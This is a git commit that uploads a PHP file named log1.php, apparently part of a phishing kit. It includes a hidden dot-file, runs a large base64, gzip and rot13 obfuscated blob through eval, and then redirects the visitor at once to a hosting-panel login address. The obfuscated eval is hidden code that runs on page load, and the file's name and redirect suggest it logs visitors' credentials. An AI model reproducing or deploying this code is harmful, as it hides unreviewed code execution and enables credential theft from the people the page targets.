9839e65c75e7526437a284e399e1f8162c203164
rflnhdyt626 <77946109+rflnhdyt626@users.noreply.github.com>
2022-01-14 18:25:43 +0700

    Add files via upload

---
+++ log1.php
@@ -0,0 +1,17 @@
+<!-- RIZKI PUTUWARU-->
+<!-- COPYRIGHT - 2021 -->
+<!-- HARGAI SAYA! JANGAN HAPUS COPYRIGHT -->
+<!-- MENGHAPUS COPYRIGHT = DOSA! -->
+<!-- SC DIBELI BUKAN DICURI! -->
+<?php
+include 'cgi-bin/.anu.php';
+eval(str_rot13(gzinflate(str_rot13(base64_decode('lUbbd+MwEH0P5B8GcOIEb2z7sNBa60BbHLcvpWQh0MtvJG7JeoN3K7Eap9vf6Yf0y0nyekZpN8v6wbZzzsyZM5qxFcVYAT7Y8SwKLqLgzgmi29Mwii/n88D5ftTv2XZFd4BGY0HZxPNJiZR4VhRSpW2Q3gsj2GaQXSUy8KzQ6FkHxQorPjThI3qvLFllT7UtK8ZjaB7cnJ6FZBCF58FWGFyezK6jYAxuYx6ZADsXXLSp5JPMWUuXKSsJk63FXljeoFo5ZC4zknivse0kzFWKbLI0d5uAO6exxSagkqtJww5rPAV4MbdT8NrvgX4KKWWZDJ2ScYIrgieQrZXLlszL5VekJX+Uz0esJdJzx0O+mfYxmUcNPjudhWqO3ApI1o2lgrEdjzk+kiTvyqgjfbAsGAyggZvjnoKQ1xIrnJV2LqFzUbSgjiFy6fOLzLjmtXP6NhKB4WWTb2sFC0iMyII3yyC3kjEtxtx9v+f6vv/xXlCvUiafCdnAx7u2uv3eMZ32ez+mRktDmEA7DMjZ8VGmiNpMkez6zhrhtdvI7NwNeksIvG4dXyWk1s6ewBRru7iN3At9rJpjgL44gMC6Qu6x9QmLNPaKYC4xavmSyglj+cS9gmLLI8gKkegJ9RUj7uHh12LuwZ4sutJIT7bI+YQxKoe2bGYyhrbZ+q92pv54s4z+sCyVjRLG43Oc68vzu64N2iHxu0ENFPVq9u+ve6Y/422L9RIXWL0/dZuwkjzoZCVbQuEVqYbkv5b1YC/azPX1IrqZz7TuQdY/UMa/su7f+9/HXzeiR2sTr5OUjo5+Ag==')))));
+?>
+
+<html>
+<head>
+<meta http-equiv="REFRESH" content="0;url=https://login.psxhost.online:2087">
+</head>
+<body>
+</body>
+</html>
